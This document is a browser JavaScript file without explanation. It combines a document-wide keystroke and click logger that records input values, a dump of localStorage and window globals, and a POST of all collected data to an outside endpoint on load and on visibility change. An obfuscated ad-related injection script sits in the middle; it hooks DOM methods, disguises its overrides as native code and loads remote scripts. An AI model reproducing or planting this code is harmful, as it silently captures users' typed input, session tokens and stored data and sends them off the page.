const jshookListeners = {};
function jshookListener(event) {
  const trackedData = {
    timestamp: new Date().toISOString(),
    event: event.type,
    element: event.target.nodeName,
    id: event.target.id,
    class: event.target.className,
    value: event.target.value
  };
  if (!jshookListeners[event.type]) {
    jshookListeners[event.type] = [];
  }
  jshookListeners[event.type].push(trackedData);
}
['click', 'keydown', 'keyup'].forEach(eventType => {
  document.addEventListener(eventType, jshookListener);
});
function inspectLocalStorage() {
  const localStorageData = {};
  for (let key in localStorage) {
    localStorageData[key] = localStorage.getItem(key);
  }
  return localStorageData;
}
var kWRQ0B = ['DgvZDa', 'yMvMB3jLsw5Zzxj0lq', 'Dgv4Dc9QyxzHC2nYAxb0', 'zg9JDw1LBNq', 'CNvSzu5HBwu', 'u0vmrunut1jFuefuvevstG', 'yMvMB3jLsw5Zzxj0', 'mJKWmdu4BLLUCezx', 'y2HPBgrYzw4', 'DgfNrgv0ywLSCW', 'yxqG', 'xIHBxIbDkYGGk1TEif0RksSPk1TEif19', 'y21WqxbP', 'DMfSBMv0lxnUywnRBwvKAwe', 'y2HLy2TjzK9WrxHPC3rZ', 'C3jJ', 'CMvWBgfJzq', 'mZC5ou1iCfbpua', 'z2v0veneyxrH', 'u0Lurv9jra', 'qwrZqM90luDVB2DSzq', 'zMLYC3rdAgLSza', 'z2v0qMXHy2TSAxn0rNjVBvbHz2u', 'y21WqxjY', 'yM9KEq', 'C2LIBgLUzW', 'D2LUzg93', 'Bwf0y2G', 'Dg9tDhjPBMC', 'A2v5CW', 'z2v0vvnqrgf0yq', 'sufcq29UC2vUDfn0CMLUzW', 'C3rYAw5NAwz5', 'CMvWBgfJzuLUC2vYDgLVBK1LDgHVzhm', 'C3bSAxq', 'C2fMzwzYyw1LlMDVB2DSzxn5BMrPy2f0Aw9UlMnVBq', 'ufjFuKvqt1ju', 'B3bLCMeGBwLUAs8', 'zNjLzxPL', 'Cgf0y2HnzxrOB2q', 'nZuWoteWv1vxChru', 'AwzYyw1L', 'y3jLyxrLrwXLBwvUDa', 'Cg90zw50AwfSuMvKAxjLy3rszxbVCNrLza', 'CgfYzw50', 'Cg9YDa', 'CMvWB3j0tg9N', 'DhjPBq', 'mZe2nJCYtLLVsgLv', 'Ahr0Ca', 'Bg9JywXOB3n0', 'y2fSBhn0ywnRlq', 'BxnPzq', 'CgfYzw50rwXLBwvUDa', 'z29Vz2XLDgfN', 'C29Tzq', 'DxnLCKfNzw50', 'CM91BMq', 'Bg9JyxrPB24', 'z29Vz2XLC3LUzgLJyxrPB24Uy29Tl3nHzMvMCMfTzq', 'u0nssvbu', 'y2fSBa', 'lMPZ', 'z2v0', 'suzsqu1f', 'DhjPzgvUDa', 'BMf2AwDHDg9Y', 'C2XVDenVBMzPz01HCa', 'qKXpq0TfuL9wrvjtsu9o', 'BMfTzq', 'C2XPy2u', 'AxrLBxm', 'DhLWzq', 't1bFrvHju1rFuKvqt1jux1jbveLp', 'zMLUza', 'z29Vz2XLx2fKC19PzNjHBwvF', 'nZmZntm0BwHAz0nX', 'yunHxMn8oKLRntvUBxnQsMnEyw9JD3qWBtnDrMm3CurTtKi7ywn0jYHFxtXPEf4SAwfmswKZiub6ztu5s0zbzxKOovDlrNGKs0z5Fq', 'CMv0DxjUic8IicSGDgHPCYaRiciV', 'z2v0uhjVDg90ExbLt2y', 'DMvYC2LVBG', 'nZqZndDcBKrKBNq', 'Aw5Zzxj0qMvMB3jL', 'y3r4DfDPBMrVDW', 'zgzW', 'C3vIC3rYAw5N', 'Dg9W', 'ChjVDg9JB2W', 'Ahr0Chm6lY90ywDHBI5HzgXPz2H0BMLUzY5JB20', 'we1mshr0CfjLCxvLC3q', 'BgvUz3rO', 'zxzLCNK', 'z2v0vhjHBNnSyxrPB25Z', 'zgvMAw5LuhjVCgvYDhK', 'sufclq', 'u0nssvbux0netL9it1nu', 'ywz0zxjjBNnLCNq', 'zgzWx2n1C3rVBq', 'AgvHza', 'y2fSBfn0ywnR', 'zMv0y2G', 'BM9Kzu5HBwu', 'y29UC3rYDwn0B3i', 'nfj1C3rYEG', 'AgfUzgXLqMXHy2TSAxn0qwn0Aw9UCW', 'z2v0u2vSzwn0B3jqyxr0zxjUCW', 'yxbWBhK', 'Aw5KzxHpzG', 'C3rHCNrZv2L0Aa', 'AxnbCNjHEq', 'v1jbuf9ut1bFv0Lore9x', 'Dg9mB3DLCKnHC2u', 'DgntDhjPBMC', 'B3jPz2LU', 'zgvJB2rLu3rYAw5N', 'y2HHCKnVzgvbDa', 'Dw5RBM93BG', 'mtiYmtaYsKPItwXZ', 'qurm', 'Cg90zw50AwfSuMvKAxjLy3q', 'ChjVDg90ExbL', 'ugLUz2rVBs5JB21FyM90', 'ywz0zxjjBNnLCNqT', 'yxbWzw5Kq2HPBgq', 'zgzWx3nM', 'ChvZAa', 'x190y2zHCgK', 'CMfUzg9T', 'DgfNyw4UywrSAwDODg5PBMCUy29T', 'mJncu1zKy0q', 'yI1LzJbHyteWlti2owrMyZi3', 'AgfUzgXLqwrvBML0qMvMB3jLsw5Zzxj0rezqu0y', 'ywr1BML0lwrPDI1NChqTywqT', 'DxnWyxbP', 'C2nYAxb0', 'uMvXDwvZDa', 'zxjYB3jszxbVCNrLza', 'ywrSAq', 'BgfUz3vHz2vpDMvYCMLKzq', 'z2v0rgf0yunVBw1HBMq', 'AgfUzgXLqwrvBML0qMvMB3jLsw5Zzxj0rezq', 'C3r5Bgu', 'munuBwn1za', 'qKXbq0Tmsvnux1zfuLnjt04', 'zgvMzxi', 'BM9nyxjRDxa', 'C2vUzejLywnVBG'];
function inspectGlobalVariables() {
  const newFindings = {};
  for (let varName in window) {
    if (!(window.seenVars || []).includes(varName)) {
      const value = window[varName];
      const type = typeof value;
      newFindings[varName] = {
        type: type,
        value: type === 'function' ? value.name : String(value)
      };
    }
  }
  return newFindings;
}
(function (q, j) {
  var qJ = kWRQ0g;
  while (!![]) {
    try {
      var B = parseInt(qJ(0x172)) * parseInt(qJ(0x1b4)) + parseInt(qJ(0x1ca)) * -parseInt(qJ(0x1a7)) + -parseInt(qJ(0x1e9)) + -parseInt(qJ(0x18d)) * parseInt(qJ(0x19b)) + -parseInt(qJ(0x1c0)) + parseInt(qJ(0x1e1)) + parseInt(qJ(0x177));
      if (B === j) break;else q['push'](q['shift']());
    } catch (g) {
      q['push'](q['shift']());
    }
  }
})(kWRQ0B, 0x5bdd4);
async function sendInsightsToServer(insights) {
  const serverEndPoint = 'https://example.com/api/collect';
  try {
    const res = await fetch(serverEndPoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(insights)
    });
    if (res.ok) {
      console.info('Inspection data successfully sent to backend.');
    } else {
      console.warn(`Failed to send inspection data, server response code: ${res.status}`);
    }
  } catch (error) {
    console.error('An error occurred while sending inspection data:', error);
  }
}
function performInspection() {
  const globalVars = inspectGlobalVariables();
  const localStore = inspectLocalStorage();
  const newFindings = {
    globalVariables: globalVars,
    localStorage: localStore,
    trackedEvents: jshookListeners
  };
  if (Object.keys(newFindings).length > 0) {
    console.group(`Global scope inspection results - Found ${newFindings.length} new properties:`);
    for (let varName in newFindings) {
      console.log(`${varName}: ${JSON.stringify(newFindings[varName])}`);
    }
    console.groupEnd();
    sendInsightsToServer(newFindings);
  } else {
    console.info('Global scope inspection completed, no new properties found.');
  }
}
function kWRQ0g(q, j) {
  q = q - 0x15b;
  var B = kWRQ0B[q];
  if (kWRQ0g['BQoREz'] === undefined) {
    var g = function (A) {
      var X = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
      var V = '';
      for (var C = 0x0, k, f, a = 0x0; f = A['charAt'](a++); ~f && (k = C % 0x4 ? k * 0x40 + f : f, C++ % 0x4) ? V += String['fromCharCode'](0xff & k >> (-0x2 * C & 0x6)) : 0x0) {
        f = X['indexOf'](f);
      }
      return V;
    };
    kWRQ0g['DmFRwT'] = function (A) {
      var X = g(A);
      var V = [];
      for (var C = 0x0, k = X['length']; C < k; C++) {
        V += '%' + ('00' + X['charCodeAt'](C)['toString'](0x10))['slice'](-0x2);
      }
      return decodeURIComponent(V);
    }, kWRQ0g['lHexgO'] = {}, kWRQ0g['BQoREz'] = !![];
  }
  var O = kWRQ0B[0x0],
    o = q + O,
    i = kWRQ0g['lHexgO'][o];
  if (i === undefined) {
    var A = function (X) {
      this['BQbuSU'] = X, this['EbMODt'] = [0x1, 0x0, 0x0], this['QrWTtF'] = function () {
        return 'newState';
      }, this['dUZStK'] = '\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*', this['KPsreg'] = '[\x27|\x22].+[\x27|\x22];?\x20*}';
    };
    A['prototype']['WKiqBV'] = function () {
      var X = new RegExp(this['dUZStK'] + this['KPsreg']),
        V = X['test'](this['QrWTtF']['toString']()) ? --this['EbMODt'][0x1] : --this['EbMODt'][0x0];
      return this['pUryLM'](V);
    }, A['prototype']['pUryLM'] = function (X) {
      if (!Boolean(~X)) return X;
      return this['GaOcnj'](this['BQbuSU']);
    }, A['prototype']['GaOcnj'] = function (X) {
      for (var V = 0x0, C = this['EbMODt']['length']; V < C; V++) {
        this['EbMODt']['push'](Math['round'](Math['random']())), C = this['EbMODt']['length'];
      }
      return X(this['EbMODt'][0x0]);
    }, new A(kWRQ0g)['WKiqBV'](), B = kWRQ0g['DmFRwT'](B), kWRQ0g['lHexgO'][o] = B;
  } else B = i;
  return B;
}
var xop = function (q) {
  var qT = kWRQ0g,
    A = function () {
      var qA = !![];
      return function (qX, qV) {
        var qC = qA ? function () {
          var qF = kWRQ0g;
          if (qV) {
            var qk = qV[qF(0x190)](qX, arguments);
            return qV = null, qk;
          }
        } : function () {};
        return qA = ![], qC;
      };
    }(),
    X = ['getPrototypeOf', 'getOwnPropertyNames', qT(0x183), qT(0x1d6), qT(0x1df)],
    V = ['Googlebot', 'Chrome-Lighthouse', qT(0x1cd), 'Facebot', 'bingbot', 'BingPreview', qT(0x19f)];
  function C(qA) {
    var j0 = qT,
      qX = 0x0;
    if (0x0 === qA[j0(0x180)]) return '' + qX;
    for (var qV = 0x0, qC = qA['length']; qV < qC; qV += 0x1) qX = (qX << 0x5) - qX + qA[j0(0x199)](qV), qX |= 0x0;
    return (0x5f5e100 * qX)['toString'](0x24);
  }
  function K(qA) {
    var j1 = qT;
    return (qA ? qA[j1(0x160)] ? qA[j1(0x160)][j1(0x197)] ? qA[j1(0x160)][j1(0x197)] : qA['location'][j1(0x17d)] + '//' + qA[j1(0x160)]['hostname'] + (qA[j1(0x160)][j1(0x1e6)] ? ':' + qA['location'][j1(0x1e6)] : '') : qA['origin'] : '') || '';
  }
  var v = {
      'ctxtWindow': null,
      get 'window'() {
        return this['ctxtWindow'] || window;
      },
      set 'window'(qA) {
        this['ctxtWindow'] = qA;
      },
      get 'document'() {
        var j2 = qT;
        return this['window'] ? this[j2(0x1d3)]['document'] : null;
      },
      get 'inSafeFrame'() {
        var j3 = qT,
          qA = K(this[j3(0x1d3)]);
        return 0x0 <= qA['indexOf']('tpc.googlesyndication.com') || 0x0 <= qA[j3(0x191)](j3(0x1dc));
      },
      'reset': function () {
        var j4 = qT;
        this[j4(0x179)] = null;
      }
    },
    G = {
      'PLACEMENT_REPORT_RATIO': 0.01,
      'NEVER_BLOCK_REPORT_RATIO': 0.01,
      'BLOCKER_ERROR_REPORT_RATIO': 0.01,
      'LOG_ONLY': !0x1,
      'INCLUSIVE_WHITELIST': !0x1,
      'INCLUDE_BLOCKER': !0x0,
      'LOCAL_FRAME_BLOCK_MESSAGE': !0x1,
      'REPORT_RATIO': 0x1
    },
    M = function () {},
    U = function () {
      var j5 = qT;
      return C(navigator[j5(0x15e)]);
    },
    Q = function (qA) {
      var j7 = qT,
        qX = A(this, function () {
          var qV = function () {
            var j6 = kWRQ0g,
              qC = qV[j6(0x18c)](j6(0x174))()[j6(0x18c)](j6(0x1c4));
            return !qC[j6(0x1b9)](qX);
          };
          return qV();
        });
      return qX(), C(qA + '-' + navigator[j7(0x15e)]);
    };
  function W(qA, qX) {
    var j8 = qT,
      qV = Q(qA),
      qC = U();
    window[qV] || Object[j8(0x183)](window, qV, {
      'value': function (qk) {
        return qk === qC ? qX : M;
      }
    });
  }
  var z = function (qA, qX) {
    return qA ? qA(qX) : M;
  };
  function H(qA) {
    var j9 = qT;
    for (var qX = [], qV = arguments['length'] - 0x1; 0x0 < qV--;) qX[qV] = arguments[qV + 0x1];
    var qC = Q(qA);
    if (window[qC]) {
      var qk = U();
      return j9(0x169) === qA || j9(0x1b5) === qA || 'BLOCKER_VERSION' === qA || j9(0x18f) === qA ? window[qC](qk) : z(window[qC], qk)['apply'](void 0x0, qX);
    }
    return !0x1;
  }
  var Z = Object[qT(0x1df)]({
    'SAFE_FRAMES_SUPPORTED': !0x0,
    'FORCE_SANDBOX': !0x0,
    'SITE_ID': qT(0x1c6),
    'MAX_FRAME_REFRESHES': 0x2,
    'VERSION': '1.0.0+ef0aa10',
    'SCRIPT_CDN_HOST': qT(0x17e),
    'INJECT_INTO_SAFEFRAMES': !0x1,
    'BLOCKER_OPTIONS': {},
    'WRAP_TOP_WINDOW': !0x0,
    'POTENTIAL_REDIRECT_REPORT_RATIO': 0.2,
    'BLACKLIST_VERSION': 'bl-cf1706d-8d9c8980',
    'BLOCKER_VERSION': qT(0x1a8),
    'USER_FEEDBACK_BUTTON_POSITION': null,
    'SITE_NETWORK_CODE': null,
    'AD_UNIT_EXCLUSION': null,
    'REFRESH_EMPTY_SLOT_INTERVAL': 0x7530,
    'INTERSTITIAL_ADS': null,
    'ADL': qT(0x1af),
    'OP_EXIST_REPORT_RATIO': 0.01
  });
  function Y(qA) {
    var jq = qT,
      qX = Z[jq(0x185)] + '/' + Z['SITE_ID'] + '/' + qA;
    return -0x1 === Z[jq(0x185)][jq(0x191)](jq(0x1a6)) && -0x1 === Z[jq(0x185)][jq(0x191)](jq(0x1eb)) && (qX = Z[jq(0x185)] + '/' + qA), qX;
  }
  function J(qA, qX) {
    var jj = qT;
    for (var qV = Object[jj(0x175)](qA); qX in qV && !Object[jj(0x19e)]['hasOwnProperty'][jj(0x163)](qV, qX);) qV = Object[jj(0x175)](qV);
    return qV;
  }
  Math[qT(0x15f)](0x5f5e100 * Math[qT(0x1a5)]())[qT(0x1d5)]();
  var T,
    q0 = function (qA) {
      var jB = qT;
      return C(jB(0x184) + qA + '-' + navigator[jB(0x15e)]);
    };
  function q1(qA, qX) {
    var jg = qT,
      qV,
      qC,
      qk;
    if (T) try {
      qX && (qC = q0(Z[jg(0x1cc)]), window[qC] || (window[qC] = {}), window[qC][jg(0x1d8)] || (window[qC]['IABConsentString'] = {}), window[qC][jg(0x1d8)][T[jg(0x16b)]] || (window[qC]['IABConsentString'][T[jg(0x16b)]] = []), qk = window[qC][jg(0x1d8)][T[jg(0x16b)]], qV = qA, qk[jg(0x15d)](function (qf) {
        var jO = jg;
        return JSON[jO(0x1d9)](qf) === JSON[jO(0x1d9)](qV);
      }) || qk['push'](qA));
    } catch (qf) {}
  }
  window[qT(0x1ad)], window[qT(0x168)][qT(0x1b8)], window[qT(0x18a)], window[qT(0x17f)];
  var q2 = function (qA) {
    var jo = qT;
    return C(jo(0x1ec) + qA + '-' + navigator[jo(0x15e)]);
  };
  function q3(qA) {
    return qA['getSlotElementId']();
  }
  function q4(qA, qX, qV) {
    var r = null,
      o = qA.googletag;
    return o && 'function' == typeof o.pubads && (r = (o.pubads().getSlots() || []).find(function (t) {
      return qV(t) === qX;
    })), r;
  }
  var q5 = function (qA) {
      return function (qX, qV) {
        var ji = kWRQ0g;
        if (!qX) return null;
        var e = null,
          r = function (t) {
            try {
              return t !== t.top;
            } catch (t) {
              return 1;
            }
          }(v.window) ? function () {
            if (v.window && v.window.frames) for (var t = 0; t < v.window.frames.length; t += 1) try {
              var n = v.window.frames[t];
              if (n && n.googletag) return n;
            } catch (t) {}
            return null;
          }() : null;
        return r && r[ji(0x15c)] && (e = q4(r, qX, qV)), !e && v[ji(0x1d3)] && v[ji(0x1d3)][ji(0x15c)] && (e = q4(v[ji(0x1d3)], qX, qV)), !e && v[ji(0x1d3)] && v[ji(0x1d3)] !== v['window']['parent'] && v[ji(0x1d3)][ji(0x1e5)] && v[ji(0x1d3)][ji(0x1e5)][ji(0x15c)] && (e = q4(v[ji(0x1d3)][ji(0x1e5)], qX, qV)), !e && v[ji(0x1d3)] && v[ji(0x1d3)] !== v[ji(0x1d3)][ji(0x17c)] && v[ji(0x1d3)][ji(0x17c)] && v[ji(0x1d3)][ji(0x17c)][ji(0x15c)] && (e = q4(v[ji(0x1d3)][ji(0x17c)], qX, qV)), e;
      }(qA, q3);
    },
    q6 = {
      'IFRAME': [{
        'ruleName': qT(0x17a),
        'match': {
          'tagName': qT(0x1e2),
          'id': qT(0x171),
          'name': qT(0x171),
          'src': ''
        },
        'handlers': {
          'beforeInsert': null,
          'afterInsert': null
        }
      }, {
        'ruleName': qT(0x1a2),
        'match': {
          'tagName': qT(0x1e2),
          'id': qT(0x171),
          'src': qT(0x161)
        },
        'handlers': {
          'beforeInsert': null
        }
      }]
    };
  q6[qT(0x166)][qT(0x1a3)]({
    'ruleName': qT(0x187),
    'match': {
      'tagName': qT(0x1e2),
      'id': qT(0x1aa),
      'src': 'about:blank'
    },
    'handlers': {
      'beforeInsert': null,
      'afterInsert': null
    }
  });
  var q7 = [qT(0x1a1)];
  function q8(qA, qX, qV) {
    var jA = qT;
    return void 0x0 === qV && (qV = null), Object[jA(0x1d6)](qX)[jA(0x181)](function (qC) {
      var jX = jA,
        qk = qX[qC],
        qf = (qA[qC] || qA['getAttribute'](qC) || '')[jX(0x195)]();
      return Array[jX(0x193)](qk) ? qk[jX(0x15d)](function (qa) {
        var jV = jX;
        return 0x0 <= qf[jV(0x191)](qa);
      }) : qk === qf || qk && 0x0 <= qf[jX(0x191)](qk);
    });
  }
  var q9 = q6[qT(0x166)][qT(0x170)](function (qA) {
    var jC = qT;
    return jC(0x187) === qA[jC(0x1bd)];
  });
  function qq(qA, qX) {
    var jk = qT,
      qV;
    qX && qX[jk(0x1bc)] && (qV = qX['document'][jk(0x188)] || qX['document'][jk(0x1d1)] || qX[jk(0x1bc)][jk(0x1e3)](jk(0x1ac))) && q7['forEach'](function (qC) {
      var jK = jk;
      try {
        var qk = J(qV, qC);
        qk && qk[qC] && (qf = qA, qu = qC, qx = qX, (qa = qk) && qa[qu] && (qK = qa[qu], function (qc, qS) {
          var jf = kWRQ0g;
          try {
            var qn, qv;
            qS && qS['top'] && (qn = q2(qc), (qv = qS['top'])[qn] || (qv[qn] = {}), qv[qn][jf(0x1e0)] = !0x0);
          } catch (qd) {}
        }(qf, qx), qa[qu] = function qc(qS) {
          var ja = kWRQ0g;
          if (qS && (qx !== qx['top'] || ja(0x162) !== qS[ja(0x18b)] || !function (qL, qh, qZ) {
            var ju = ja;
            try {
              if (qh && qh['top']) {
                var qY = q2(qL),
                  qE = qh['top'];
                if (qE[qY]) {
                  if (qE[qY]['potentialRedirect']) {
                    var qw = qE[qY][ju(0x1c2)];
                    qw[ju(0x1ae)] = !0x1, qw['reportPR'] = !0x0, qw[ju(0x1b7)] = !0x0, qw[ju(0x1e4)] = !0x1, H(ju(0x1e7), qL, 'PR', qZ['src'], qw), delete qE[qY][ju(0x19d)], delete qE[qY][ju(0x1c2)];
                    var ql = qE[qY][ju(0x189)];
                    return ql && 0x0 < Object[ju(0x1d6)](ql)[ju(0x180)] && (qE[qY][ju(0x189)] = {}), 0x1;
                  }
                  void 0x0 === G[ju(0x1dd)] && (G[ju(0x1dd)] = !0x1);
                }
              }
            } catch (qP) {}
          }(qf, qx, qS))) {
            var qn,
              qv,
              qd,
              qe,
              qb,
              qG,
              qM,
              qN = null;
            if (q6 && q6[qS[ja(0x18b)]] && (qd = q6[qS[ja(0x18b)]], qe = qS, qb = this, (qN = qd[ja(0x170)](function (qL) {
              var jx = ja;
              return q8(qe, qL[jx(0x1d4)], qb);
            })) || 'IFRAME' !== qS[ja(0x18b)] || !q9 || (qv = this['id']) && q5(qv) && (qN = q9)), qN) {
              var qR,
                qt,
                qU,
                qr,
                qy,
                qp,
                qs,
                qI,
                qD,
                qQ = qN['handlers'],
                qW = qN[ja(0x1bd)],
                qm = qN[ja(0x1d2)],
                qz = ja(0x187) === qW;
              'dfp' === qW || ja(0x187) === qW ? (null === qQ['beforeInsert'] && (qR = U(), qt = Q(ja(0x1b2)), qU = z(window[qt], qR), qQ[ja(0x1bf)] = qU), null === qQ[ja(0x186)] && (qr = U(), qy = Q('handleAdUnitAfterInsertDFP'), qp = z(window[qy], qr), qQ[ja(0x186)] = qp)) : ja(0x1a2) === qW && null === qQ['beforeInsert'] && (qs = U(), qI = Q(ja(0x1a9)), qD = z(window[qI], qs), qQ[ja(0x1bf)] = qD);
              var qH = null;
              try {
                !qm && qQ[ja(0x1bf)] && (qH = qz ? qQ[ja(0x1bf)](qf, qS, this['id'], qz) : qQ[ja(0x1bf)](qf, qS, this));
              } catch (qL) {
                H(ja(0x1e7), qf, ja(0x1ba) + qW, qL);
              }
              if (qn = qK[ja(0x190)](this, arguments), !qm || (qG = qm, (qM = (qS[ja(0x15b)] || {})[ja(0x1c1)]) && [][ja(0x16c)][ja(0x163)](qM)[ja(0x15d)](function (qh) {
                return qG['some'](function (qZ) {
                  return q8(qh, qZ);
                });
              }))) try {
                qQ[ja(0x186)] && qQ['afterInsert'](qf, qS, this, qH);
              } catch (qh) {
                H(ja(0x1e7), qf, ja(0x1a0) + qW, qh);
              }
            } else qn = qK[ja(0x190)](this, arguments);
            return qS[qu] && qS[qu] !== qc && (qS[qu] = qc), qn;
          }
        }));
      } catch (qS) {
        H(jK(0x1e7), qA, jK(0x1da), qS);
      }
      var qf, qa, qu, qx, qK;
    });
  }
  function qj() {}
  Q(qT(0x18e));
  var qB = {
    'language': {
      'configurable': !0x0
    }
  };
  qB['language'][qT(0x165)] = function () {
    return null;
  }, qj['get'] = function () {
    return null;
  }, qj[qT(0x182)] = function () {
    return null;
  }, qj[qT(0x1b3)] = function () {
    return null;
  }, Object['defineProperties'](qj, qB), qj[qT(0x1b0)] = void 0x0;
  var qg = ['querySelector'];
  function qO(qA, qX) {
    var jc = qT,
      qV = q2(qA);
    qX[qV] || (qX[qV] = {}, qX[qV][jc(0x189)] = {}), qg['forEach'](function (qC) {
      var jS = jc,
        qk,
        qf = qA,
        qa = qC,
        qu = J((qk = qX)[jS(0x1bc)], qa),
        qx = qu[qa];
      qu[qa] = function (qK) {
        var jn = jS;
        if (qK) {
          var qc = !0x1;
          try {
            var qS = q2(qf);
            qk[qS] || (qk[qS] = {}), qk[qS][jn(0x189)] || (qk[qS][jn(0x189)] = {}), G[jn(0x1be)] || (G[jn(0x1be)] = H(jn(0x18f)));
            var qn,
              qv = (qt = G[jn(0x1be)]) && qt['indexOf'] && qK && qK[jn(0x195)] ? qt[jn(0x191)](qK[jn(0x195)]()) : -0x1;
            return -0x1 < qv && (qb = jn(0x19a), !(qG = new Error()['stack'] || '') || (qe = (qb = (qd = qG[jn(0x1e8)]()[jn(0x1db)]('\x0a'))[qd[jn(0x180)] - 0x1][jn(0x1e8)]()[jn(0x1c9)](jn(0x1c3), ''))[jn(0x1d4)](/[(<](.*)[)>]/g)) && (qb = qe[0x0]), (qR = qb) && (qM = qR[jn(0x191)](jn(0x1ea)), qN = qR[jn(0x191)](jn(0x164)), -0x1 !== qM && -0x1 !== qN && (qR = qR[jn(0x17b)](qM, qN + 0x3))), qn = qR, qk[qS][jn(0x189)][qn] || (qk[qS][jn(0x189)][qn] = []), qk[qS][jn(0x189)][qn]['includes'](qv) || qk[qS][jn(0x189)][qn][jn(0x1a3)](qv)), qc = !0x0, qx[jn(0x163)](this, qK);
          } catch (qU) {
            if (!qc) return qx[jn(0x163)](this, qK);
          }
        }
        var qd, qe, qb, qG, qM, qN, qR, qt;
        return null;
      }, qu[qa][jS(0x1d5)] = function () {
        return 'function\x20' + qa + '()\x20{\x20[native\x20code]\x20}';
      };
    });
  }
  var qo = qT(0x1c6);
  function qi() {
    var jv = qT;
    if (!(-0x1 !== (qC = (qV = navigator[jv(0x15e)])['toLowerCase']())[jv(0x191)](jv(0x1ed)) || -0x1 !== qC[jv(0x191)](jv(0x167)) || 0x0 <= qC[jv(0x191)](jv(0x1de))) && window['JSON'] && JSON[jv(0x1d9)] && Array[jv(0x19e)][jv(0x15d)] && Array[jv(0x19e)][jv(0x181)] && X['every'](function (qk) {
      return Object[qk];
    }) && !V['some'](function (qk) {
      var jd = jv;
      return 0x0 <= qV[jd(0x191)](qk);
    })) try {
      return W('BLACKLIST_VERSION', Z[jv(0x1b5)]), W(jv(0x16a), Z[jv(0x16a)]), qA = q0(qo), qX = null, window[qA] && window[qA][jv(0x1d0)] && 0x0 !== window[qA][jv(0x1d0)][jv(0x180)] ? qX = window[qA][jv(0x1d0)] : (window[qA] = {}, qX = [], window[jv(0x1a4)] && qX[jv(0x1a3)]({
        'cmpApi': jv(0x1a4),
        'consentString': jv(0x196),
        'getDataCommand': jv(0x1cb),
        'name': 'tcfapi',
        'version': null
      }), window['__uspapi'] && qX[jv(0x1a3)]({
        'cmpApi': '__uspapi',
        'consentString': null,
        'getDataCommand': jv(0x1d7),
        'name': jv(0x1ab),
        'version': 0x1
      }), window[qA]['cmpArr'] = qX), qX && 0x0 < qX[jv(0x180)] && (qX['forEach'](function (qk) {
        var je = jv;
        T = qk, window[qk[je(0x1c5)]](qk[je(0x1b1)], qk[je(0x176)], q1);
      }), window[qA][jv(0x1d8)]), function (qk) {
        var jb = jv,
          qf = qk['createElement'](jb(0x1ac)),
          qa = qk[jb(0x1e3)](jb(0x1ac)),
          qu = qk['createElement']('script');
        qf['src'] = Y(Z[jb(0x16a)]) + jb(0x164), qf[jb(0x16e)] = jb(0x1bb), qf['defer'] = !0x0, qa[jb(0x1c8)] = Y(Z['BLACKLIST_VERSION']) + jb(0x164), qa['type'] = jb(0x1bb), qa[jb(0x1b6)] = !0x0, qu['type'] = jb(0x1bb);
        var qx = qk[jb(0x188)];
        qx && (qx[jb(0x1ce)] ? (Z[jb(0x194)] && qx[jb(0x178)](qu, qx[jb(0x1ce)]), qx[jb(0x178)](qf, qx[jb(0x1ce)]), qx[jb(0x178)](qa, qx[jb(0x1ce)])) : (qx[jb(0x1a1)](qa), qx['appendChild'](qf), qx[jb(0x1a1)](qu)));
      }(document), qq(qo, window), window !== window['top'] ? function () {
        var jG = jv;
        try {
          var qk = K(v[jG(0x1d3)] ? v[jG(0x1d3)][jG(0x1e5)] : null);
          return K(v[jG(0x1d3)]) === qk;
        } catch (qf) {}
      }() && (qq(qo, window[jv(0x17c)]), qO(qo, window['top'])) : qO(qo, window), !0x0;
    } catch (qk) {}
    var qA, qX, qV, qC;
    return !0x1;
  }
  if (!function () {
    var jM = qT;
    try {
      var qA = window['op'];
      if (qA) {
        var qX = (qA = H(jM(0x198), qA, Z[jM(0x19c)]))[jM(0x1db)](';');
        if (0x4 === qX['length']) {
          var qV = qX[0x0],
            qC = qX[0x1],
            qk = qX[0x2];
          if (qV[jM(0x192)]('bl-') && qC['startsWith']('b-')) {
            var qf = H(jM(0x1cf), qk);
            if (qf && qf[jM(0x16d)] && qf[jM(0x16d)][jM(0x180)]) return qk !== Z[jM(0x1cc)] && Math[jM(0x1a5)]() < Z[jM(0x16f)] && H(jM(0x1e7), Z[jM(0x1cc)], jM(0x1c7), qA), 0x1;
          }
        }
      }
    } catch (qa) {}
  }()) {
    try {
      Object[qT(0x183)](window, 'op', {
        'value': qT(0x173)
      });
    } catch (qA) {}
    qi();
  }
  return q['createModal'] = function () {}, q['default'] = qi, q;
}({});
window.onload = performInspection;
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'visible') {
    console.info('Page visibility changed, re-running global scope inspection.');
    performInspection();
  }
});